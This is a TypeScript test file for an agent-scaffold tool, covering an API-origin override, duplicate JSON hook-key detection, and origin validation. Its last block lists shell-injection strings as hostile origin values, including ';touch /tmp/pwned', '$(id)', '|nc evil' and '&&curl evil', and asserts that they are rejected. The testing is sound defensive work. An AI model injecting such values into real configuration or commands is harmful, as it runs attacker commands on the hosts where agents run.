// Card ec7bdad8 (B-wave, parent bd450735). Two upstream adoptions into agent-scaffold.ts, both
// additive, both scoped by MikroB's approval of the plan-grilling verdict:
//
//   findDuplicateJsonKeys -- JSON.parse keeps only the LAST occurrence of a duplicated key, so a
//     settings.json with two hook-event keys silently drops every hook in the earlier block. No
//     parse error, no warning, the guards just stop running. THIS FLEET HAS ALREADY HIT IT:
//     `fix(hooks): merge duplicate Stop keys in .claude/settings.json`. The evidence exists only in
//     the raw text -- a parsed object cannot reveal it -- so the check must run before parsing.
//
//   AGENT_API_ORIGIN -- "where does an AGENT reach the API from where it runs" is a different
//     question from DASHBOARD_PUBLIC_URL's "where does the BROWSER reach the dashboard". Upstream
//     measured a live install where they differed (hairpin NAT: the public name resolved, its 443
//     was unreachable from the host, so generated curl examples returned exit 7 -- the agent gets
//     nothing at all, not an error it can surface).
//
// The backward-compatibility claim is the load-bearing one here, so it is measured rather than
// trusted: empty AGENT_API_ORIGIN must reproduce the old two-step fallback exactly.
import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { resolveDashboardOrigin } from '../web/agent-scaffold.js'
import { findDuplicateJsonKeys } from '../web/json-dup-keys.js'
import { REPO_ROOT } from './helpers/repo-location.js'

/** The fork's PRE-adoption resolver, verbatim. */
function legacyOrigin(publicUrl: string, port: number | string): string {
  return (publicUrl || `http://localhost:${port}`).replace(/\/$/, '')
}

describe('AGENT_API_ORIGIN is additive (card ec7bdad8)', () => {
  const CASES: Array<[string, number | string]> = [
    ['', 3420],
    ['', '3420'],
    ['https://dash.example.com', 3420],
    ['https://dash.example.com/', 3420],
    ['http://localhost:9999', 3420],
  ]

  it.each(CASES)('empty override reproduces the old behaviour exactly (%s, %s)', (url, port) => {
    expect(resolveDashboardOrigin(url, port, '')).toBe(legacyOrigin(url, port))
    // Omitting the argument entirely must behave the same as passing empty -- every existing
    // caller relies on the default, so a default of anything else would silently redirect them.
    expect(resolveDashboardOrigin(url, port)).toBe(legacyOrigin(url, port))
  })

  it('a set override WINS over the public URL, which is the whole point', () => {
    expect(resolveDashboardOrigin('https://dash.example.com', 3420, 'http://10.0.0.5:3420'))
      .toBe('http://10.0.0.5:3420')
  })

  it('the override is trailing-slash normalised like the other two', () => {
    expect(resolveDashboardOrigin('', 3420, 'http://10.0.0.5:3420/')).toBe('http://10.0.0.5:3420')
  })

  it('precedence is override > publicUrl > localhost, in that order', () => {
    expect(resolveDashboardOrigin('', 3420, '')).toBe('http://localhost:3420')
    expect(resolveDashboardOrigin('https://pub', 3420, '')).toBe('https://pub')
    expect(resolveDashboardOrigin('https://pub', 3420, 'https://agent')).toBe('https://agent')
  })

  it('heartbeat-agent-scaffold passes it too, so the pair cannot drift', () => {
    // Both files render curl examples into agent CLAUDE.md. One threading the override and the
    // other not would send half the fleet at the dead address -- the exact failure being fixed.
    const src = readFileSync(join(REPO_ROOT, 'src/web/heartbeat-agent-scaffold.ts'), 'utf-8')
    expect(src).toContain('resolveDashboardOrigin(DASHBOARD_PUBLIC_URL, WEB_PORT, AGENT_API_ORIGIN)')
  })
})

describe('duplicate hook keys are detected before parsing (card ec7bdad8)', () => {
  it('finds a duplicated hook-event key and names its path', () => {
    const raw = '{"hooks":{"PreToolUse":[{"a":1}],"PostToolUse":[],"PreToolUse":[{"b":2}]}}'
    expect(findDuplicateJsonKeys(raw)).toContain('hooks.PreToolUse')
  })

  it('THE REAL INCIDENT SHAPE: a duplicated Stop key, which this fleet actually shipped', () => {
    const raw = '{"hooks":{"Stop":[{"first":true}],"Stop":[{"second":true}]}}'
    expect(findDuplicateJsonKeys(raw)).toContain('hooks.Stop')
    // And the reason the raw text is the only witness: after parsing, the first block is gone.
    expect(JSON.parse(raw).hooks.Stop).toEqual([{ second: true }])
  })

  it('a clean settings file reports nothing', () => {
    const raw = '{"hooks":{"PreToolUse":[{"a":1}],"Stop":[{"b":2}]},"model":"opus"}'
    expect(findDuplicateJsonKeys(raw)).toEqual([])
  })

  it('the same key in DIFFERENT objects is not a duplicate', () => {
    // Otherwise every settings file would warn: sibling hook arrays legitimately repeat key names.
    const raw = '{"a":{"cmd":1},"b":{"cmd":2}}'
    expect(findDuplicateJsonKeys(raw)).toEqual([])
  })

  it('a duplicate inside an array element is reported with its index', () => {
    const raw = '{"hooks":{"PreToolUse":[{"x":1,"x":2}]}}'
    expect(findDuplicateJsonKeys(raw)[0]).toContain('[0]')
  })

  it('a key whose STRING VALUE contains a quote or brace does not confuse the scanner', () => {
    const raw = '{"cmd":"echo \\"}{\\" && :","cmd":"second"}'
    expect(findDuplicateJsonKeys(raw)).toEqual(['cmd'])
  })
})

describe('the detector is actually WIRED, not just present (card ec7bdad8)', () => {
  it('ensureAgentHooks checks the raw text BEFORE JSON.parse', () => {
    // A detector nobody calls detects nothing -- the failure mode this whole B-wave keeps finding.
    const src = readFileSync(join(REPO_ROOT, 'src/web/agent-scaffold.ts'), 'utf-8')
    const fn = src.indexOf('export function ensureAgentHooks')
    expect(fn).toBeGreaterThan(-1)
    const body = src.slice(fn, fn + 4000)
    const check = body.indexOf('findDuplicateJsonKeys(rawExisting)')
    const parse = body.indexOf('JSON.parse(rawExisting)')
    expect(check, 'the dup-key check is not wired into ensureAgentHooks').toBeGreaterThan(-1)
    expect(parse, 'the raw text is not reused for the parse').toBeGreaterThan(-1)
    // Order matters: after the parse, the duplicate is already gone.
    expect(check).toBeLessThan(parse)
  })
})

describe('AGENT_API_ORIGIN is validated too -- the new parameter is not a new door (ec7bdad8 merge)', () => {
  // WHY THIS EXISTS. Merging develop into this branch collided on resolveDashboardOrigin: this
  // branch adds the third parameter, develop had meanwhile landed card 1075d0e4's origin
  // VALIDATION, and this branch's copy predates it. Taking this side wholesale would have reverted
  // a shipped security fix -- the same trap Cybersec caught one card over on e80c011a, where I had
  // already done exactly that once. The resolution is the union.
  //
  // But a union raises a question the union itself does not answer: agentApiOrigin is a SECOND
  // config-sourced string reaching the SAME sink (the curl recipes written into every agent's
  // CLAUDE.md). Validating only publicUrl would close the front door and leave the new one open.
  // agent-launch-key-quoting.test.ts pins the publicUrl half; this pins the new half, because
  // nothing did -- every existing three-argument call passes a BENIGN origin.
  const SHELLY = [
    'http://x;touch /tmp/pwned;#',
    'http://h$(id)',
    'http://h`id`',
    'http://h|nc evil 1',
    'http://h&&curl evil',
  ]

  it.each(SHELLY)('falls back rather than passing through: %s', (evil) => {
    expect(resolveDashboardOrigin('', 3420, evil)).toBe('http://localhost:3420')
  })

  it('a hostile agentApiOrigin does not win over a LEGITIMATE publicUrl either', () => {
    // The precedence rule is agentApiOrigin || publicUrl. If the hostile value were merely
    // rejected at the end, a caller could still lose the good value on the way -- so assert the
    // outcome, not the branch: what comes back must be the safe fallback, never the shell.
    expect(resolveDashboardOrigin('https://dash.example.com', 3420, 'http://x;id;#'))
      .toBe('http://localhost:3420')
  })

  it('and the LEGITIMATE agentApiOrigin shapes still work -- not blanket refusal', () => {
    // Without this, "reject everything" would score as a passing security check and would silently
    // break the hairpin-NAT deployment this parameter was adopted for.
    expect(resolveDashboardOrigin('', 3420, 'http://10.0.0.5:3420')).toBe('http://10.0.0.5:3420')
    expect(resolveDashboardOrigin('', 3420, 'https://api.internal/marveen')).toBe('https://api.internal/marveen')
    expect(resolveDashboardOrigin('', 3420, 'http://10.0.0.5:3420/')).toBe('http://10.0.0.5:3420')
  })
})
